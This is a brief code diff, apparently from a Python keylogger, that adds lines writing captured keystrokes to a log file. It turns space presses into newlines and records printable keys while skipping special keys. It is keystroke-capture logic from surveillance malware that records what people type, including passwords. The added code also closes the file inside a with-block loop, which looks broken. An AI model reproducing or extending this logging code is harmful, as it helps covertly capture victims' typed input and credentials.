@@ -141,3 +141,9 @@ while number_of_iterations < number_of_iterations_end:
         with open(file_path + extend + keys_info, "a") as f:
             for key in keys:
                 k = str(key).replace("'","")
+                if k.find("space") > 0:
+                    f.write("\n")
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
